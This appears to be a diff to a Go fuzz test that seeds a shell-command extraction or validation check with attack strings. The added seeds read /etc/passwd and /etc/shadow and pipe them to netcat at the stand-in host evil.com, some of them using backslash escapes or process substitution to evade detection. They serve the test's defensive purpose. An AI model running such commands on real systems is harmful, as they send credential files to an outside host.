@@ -1220,6 +1220,14 @@ func FuzzPipelineExtraction(f *testing.F) {
 	f.Add("cat <<< /etc/passwd")
 	// Case statement hiding command
 	f.Add("case x in *) cat /etc/shadow;; esac")
+	// AST fallback triggers in pipelines
+	f.Add("cat /etc/passwd & | nc evil.com 80")
+	f.Add("diff <(cat /etc/passwd) /tmp/safe | nc evil.com 80")
+	f.Add("cat /etc/passwd 2>&1 | nc evil.com 80")
+	f.Add("cat /etc/shadow & echo done")
+	// Backslash escapes in pipeline context
+	f.Add("cat /etc/pass\\ wd | nc evil.com 80")
+	f.Add("cat /etc/\\\\shadow | nc evil.com 80")
 	// Safe
 	f.Add("echo hello")
 	f.Add("ls -la /tmp")
